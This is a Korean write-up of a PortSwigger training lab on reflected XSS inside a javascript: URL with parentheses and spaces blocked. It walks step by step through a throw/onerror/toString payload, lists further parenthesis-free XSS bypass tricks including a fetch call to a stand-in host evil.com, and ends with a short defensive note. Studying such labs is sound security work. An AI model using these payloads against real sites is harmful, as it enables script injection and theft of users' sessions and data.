# Lab: Reflected XSS in a JavaScript URL with some characters blocked

## 개요

- **난이도**: Expert
- **주제**: Cross-Site Scripting (XSS) — Reflected / `javascript:` URL / 괄호 없는 실행 / `throw` + `onerror` + `toString` 체인
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

## 목표

`javascript:` URL 안에 사용자 입력이 반영되지만 `(`, `)`, 공백 등 일부 문자가 차단된 환경에서, 괄호 없이 `onerror = alert` + `throw` 조합으로 `alert` 를 실행시킨다.

## 주입 컨텍스트

서버가 생성하는 HTML:

```html
<a href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5'}).finally(_=>window.location='/')">
  Back to Blog
</a>
```

사용자 입력이 `fetch()` 의 `body` 문자열 안에 삽입된다.

## 최종 페이로드

```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{'
```

URL 인코딩 형태:

```
%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{%27
```

## 페이로드 삽입 후 생성되는 전체 JS

```javascript
javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{''}).finally(_=>window.location='/')
```

## 단계별 분해 분석

### 1단계: 기존 JS 구문 닫기

```javascript
// 원래 코드
fetch('/analytics', {method:'post', body:'/post?postId=5&USER_INPUT'})

// 페이로드 삽입 후
fetch('/analytics', {method:'post', body:'/post?postId=5&'}, ...)
//                                                          ↑
//                   ' 로 body 문자열 닫기
//                   } 로 options 객체 닫기
//                   , 로 추가 인자 시작
```

`fetch()` 는 인자를 2개만 사용하고 나머지는 무시하지만, **JS는 모든 인자를 호출 전에 평가(evaluate)한다**. 이 성질을 이용한다.

---

### 2단계: `fetch()` 추가 인자들 — 평가 순서 이해

```javascript
fetch(
  '/analytics',                              // 인자 1: URL
  {method:'post', body:'/post?postId=5&'},   // 인자 2: options (사용됨)
  x = x=>{throw/**/onerror=alert,1337},      // 인자 3: fetch 무시, 그러나 평가됨
  toString = x,                              // 인자 4: fetch 무시, 그러나 평가됨
  window+'',                                 // 인자 5: fetch 무시, 그러나 평가됨
  {''}                                       // 인자 6: 닫는 구문 정리
)
```

JS 엔진은 함수를 호출하기 **전에** 모든 인자를 왼쪽에서 오른쪽으로 평가한다.  
→ 인자 3~5 는 `fetch` 에게 전달되지 않지만 **코드로서 실행된다**.

---

### 3단계: `x = x=>{throw/**/onerror=alert,1337}` — 화살표 함수 정의

```javascript
x = x => {
    throw/**/onerror=alert, 1337
    // → throw (onerror=alert, 1337)
    //    1. onerror = alert  (window.onerror 를 alert 함수로 설정)
    //    2. 쉼표 연산자: 최종값 = 1337
    //    3. throw 1337       (숫자 1337 을 예외로 던짐)
}
```

**`/**/` 이 공백 역할을 하는 이유**:  
공백이 차단되었을 경우 JS 주석 `/**/` 이 토큰 구분자로 동작한다.

```javascript
throw onerror=alert,1337    // 공백 있는 버전
throw/**/onerror=alert,1337 // 공백 없는 버전 (동일 동작)
```

---

### 4단계: `toString = x` — window.toString 교체

```javascript
toString = x
// → 전역 스코프에서의 toString = window.toString
// → window.toString 을 화살표 함수 x 로 교체
```

**전역 스코프에서 변수 할당 = window 속성 할당**:

```javascript
// 브라우저 전역 스코프에서
a = 1           // → window.a = 1
toString = fn   // → window.toString = fn
onerror = fn    // → window.onerror = fn
```

---

### 5단계: `window+''` — toString 강제 호출 → throw 발동

```javascript
window + ''
```

```
JS 연산:
  window (객체) + '' (문자열)
  → 객체를 문자열로 변환 필요
  → window.toString() 호출
  → window.toString 은 이제 x (화살표 함수)
  → x() 실행:
      throw (onerror=alert, 1337)
      → onerror = alert 설정 (window.onerror = alert)
      → throw 1337 발생
      → window.onerror 호출 = alert 호출!
```

---

### 6단계: `{''}` — 이후 코드 오류 방지

```javascript
// 페이로드 뒤에 원래 코드가 남아있음
...window+'',{''}).finally(_=>window.location='/')
//            ↑↑
//            {} 객체로 fetch의 닫는 ) 를 정상적으로 닫음
//            '' 는 객체 내부의 빈 문자열 (문법 오류 방지)
```

페이로드가 삽입된 이후 남은 `').finally(...)` 부분이 문법 오류 없이 파싱되도록 구조를 닫아준다.

---

### 전체 실행 흐름 요약

```
1. fetch(...) 호출 전 인자 평가 시작

2. x = x=>{throw/**/onerror=alert,1337}
   → x 에 화살표 함수 할당

3. toString = x
   → window.toString 을 x 로 교체

4. window+''
   → window.toString() 호출 = x()
   → throw (onerror=alert, 1337) 실행:
       → window.onerror = alert 설정
       → throw 1337 발생
       → window.onerror(1337) 호출 = alert(1337 관련 메시지) 실행!

5. fetch() 가 실제로 호출됨 (XSS는 이미 위에서 완료)
```

## 왜 `alert()` 를 직접 쓰지 않는가

```
차단된 문자: ( )  (괄호)

직접 호출 불가:
  alert(1)         → ( 와 ) 가 차단됨
  window.alert(1)  → 동일하게 불가

괄호 없이 함수를 호출하는 방법:
  throw            → throw 는 표현식을 받음, 괄호 불필요
  onerror          → 에러 발생 시 자동 호출, 괄호 불필요
  toString         → 타입 변환 시 자동 호출, 괄호 불필요

→ 세 가지를 조합해 괄호 없이 alert 실행
```

## 핵심 정리

- `fetch()` 는 2개의 인자만 사용하지만 JS는 나머지 인자도 **모두 평가**한다 — 이 평가 과정에서 코드가 실행된다.
- `toString = x` 로 `window.toString` 을 덮어쓰면 `window+''` 가 임의 함수를 호출한다.
- `throw (onerror=alert, 1337)` 는 괄호 없이 `onerror` 를 `alert` 로 설정하고 예외를 던진다.
- `window.onerror = alert` 상태에서 예외가 발생하면 `alert` 가 에러 메시지와 함께 자동 호출된다.
- **방어**: `javascript:` URL 에 사용자 입력을 절대 삽입하지 않을 것. 불가피하다면 `encodeURIComponent()` + URL 화이트리스트 검증.

## 배운 점 및 추가 학습

### 1. `throw` 를 이용한 괄호 없는 실행 패턴

```javascript
// 일반적인 함수 호출 (괄호 필요)
alert(1)
alert(document.cookie)

// throw + onerror 패턴 (괄호 불필요)
onerror = alert
throw 1           // → alert("Uncaught 1") 호출

// throw + 쉼표 연산자
throw onerror=alert, 1
// 1. onerror = alert
// 2. throw 1 (쉼표 연산자의 마지막 값)

// throw 가 받는 것은 표현식
throw "message"    // 문자열
throw 42           // 숫자
throw new Error()  // 객체
throw (a=b, c)     // 쉼표 연산자 표현식
```

### 2. `window.onerror` 완전 이해

```javascript
// onerror 핸들러 시그니처
window.onerror = function(message, source, lineno, colno, error) {
    // message: 에러 메시지 문자열
    // source:  스크립트 URL
    // lineno:  줄 번호
    // colno:   열 번호
    // error:   Error 객체
};

// alert 을 onerror 로 설정하면:
window.onerror = alert
// throw 1 발생 시:
// alert("Uncaught 1", "about:blank", 1, 1, undefined) 호출
// → alert 의 첫 번째 인자만 표시됨: "Uncaught 1"

// → 정확히 alert(1) 은 아니지만 alert 창이 표시됨
//   PortSwigger 랩은 alert 함수 실행 여부만 확인하므로 성공으로 처리
```

### 3. `toString` 오버라이드 기법

```javascript
// window.toString 오버라이드
toString = () => { alert(1) }
window + ''    // → window.toString() → alert(1) 실행

// 다른 타입 변환 트리거들
window - 0     // → window.valueOf() → window.toString()
`${window}`    // → window.toString() (템플릿 리터럴)
+window        // → window.valueOf()

// 오버라이드 후 원복 방법
delete window.toString  // Window.prototype.toString 으로 복구
```

### 4. JS 인자 평가 순서를 이용한 사이드 이펙트

```javascript
// 함수 인자는 모두 평가된 후 함수에 전달됨
function f(a, b, c) { /* a, b, c 만 사용 */ }

f(
    sideEffect1(),   // 평가됨
    sideEffect2(),   // 평가됨
    sideEffect3()    // 평가됨 (f 에서 무시되지만)
);

// 악용: fetch 는 2개 인자만 쓰지만
fetch(url, options, evil1(), evil2(), evil3())
// evil1, evil2, evil3 이 모두 실행됨!
```

### 5. 괄호 차단 우회 기법 모음

```javascript
// 1. throw + onerror (이번 랩)
onerror=alert; throw 1

// 2. 태그드 템플릿 리터럴 (백틱으로 호출)
alert`1`                    // → alert(['1']) (배열이지만 alert 실행)
fetch`https://evil.com`     // → fetch 실행

// 3. 프록시(Proxy) 활용
new Proxy(window, {get:()=>{alert(1)}}).anything

// 4. Symbol.toPrimitive 오버라이드
window[Symbol.toPrimitive] = () => { alert(1); return 1; }
window + 1

// 5. document.write 로 새 스크립트 삽입
document.write`<script>alert(1)<\/script>`
```

### 6. `javascript:` URL 컨텍스트별 주의점

```javascript
// href 에 삽입된 javascript: URL
<a href="javascript:CODE">

// 실행 환경:
//   - 브라우저가 링크 클릭 처리
//   - 현재 페이지 컨텍스트에서 실행
//   - document, window 등 접근 가능
//   - 반환값이 문자열이면 페이지 내용으로 교체됨!

// 주의: undefined 반환 확인
javascript:void(0)     // void 연산자로 undefined 강제 반환
javascript:undefined   // 페이지 내용 교체 방지

// 이번 랩: .finally() 로 window.location 변경
// → 실행 후 리다이렉트하여 페이지 내용 교체 문제 우회
```

### 7. 쉼표 연산자 심화

```javascript
// 쉼표 연산자: 왼쪽부터 순서대로 평가, 마지막 값 반환
var x = (1, 2, 3);   // x = 3

// throw 와 조합
throw (a=1, b=2, 3)
// 1. a = 1 (할당)
// 2. b = 2 (할당)
// 3. throw 3 (예외)

// 이번 랩에서
throw (onerror=alert, 1337)
// 1. onerror = alert (window.onerror 설정)
// 2. throw 1337 (예외 발생 → onerror 호출 → alert 실행)
```
